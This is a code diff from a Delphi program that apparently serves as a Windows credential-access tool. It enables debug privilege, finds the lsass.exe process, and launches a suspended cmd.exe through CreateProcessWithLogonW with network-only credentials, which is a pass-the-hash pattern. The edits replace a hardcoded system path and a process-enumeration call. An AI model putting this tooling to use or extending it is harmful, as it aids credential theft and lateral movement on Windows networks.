@@ -835,7 +835,7 @@ begin
   si.cb := sizeof(si);
   si.dwFlags := STARTF_USESHOWWINDOW;
   si.wShowWindow := 1;
-  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('')),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar('c:\windows\system32\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
+  bret:=CreateProcessWithLogonW(pwidechar(widestring(user)),pwidechar(widestring(domain)),pwidechar(widestring('')),LOGON_NETCREDENTIALS_ONLY,nil,pwidechar(sysdir+'\cmd.exe'),CREATE_NEW_CONSOLE or CREATE_SUSPENDED ,nil,nil,@SI,@PI);
   if bret=false then writeln('failed: '+inttostr(getlasterror));
 
   if bret=true then
@@ -928,7 +928,7 @@ begin
   getmem(sysdir,Max_Path );
   GetSystemDirectory(sysdir, MAX_PATH - 1);
   debugpriv:=EnableDebugPriv('SeDebugPrivilege');
-  lsass_pid:=upsapi._EnumProc('lsass.exe');
+  lsass_pid:=upsapi._EnumProc2('lsass.exe');
   //
   //writeln(length(string('test')));
   //writeln(length(widestring('test')));
@@ -937,6 +937,7 @@ begin
   if ((paramcount=1) and (pos('/context',cmdline)>0)) then
   begin
   log('Windows Version:'+winver,1);
+  //log('SystemDirectory:'+sysdir,1);
   log('Architecture:'+osarch,1);
   log('Username:'+GetCurrUserName,1);
   //log('IsAdministrator:'+BoolToStr (IsAdministrator),1);
@@ -1504,8 +1505,12 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
     if p>0 then
        begin
        //writeln('.'+trim(input)+'.');
+       dw:=upsapi._EnumProc2(trim(input),true) ;
+       if dw<>0 then log(inttostr(dw),1);
+       {
        dw:=upsapi._EnumProc(trim(input));
        if dw<>0 then log(inttostr(dw),1);
+       }
        goto fin;
        end;
     p:=pos('/enummod',cmdline);  ////can be done with taskkill
@@ -1642,7 +1647,7 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
   if p>0 then
    begin
    if user='' then exit;
-   if binary='' then binary:='c:\windows\system32\cmd.exe';
+   if binary='' then binary:=sysdir+'\cmd.exe';
    //writeln('SeTcbPrivilege:'+BoolToStr ( EnableDebugPriv('SeTcbPrivilege'),true));
    //writeln('SeAssignPrimaryTokenPrivilege:'+BoolToStr ( EnableDebugPriv('SeAssignPrimaryTokenPrivilege'),true));
    writeln(BoolToStr (runTSprocess(strtoint(user),binary),true));
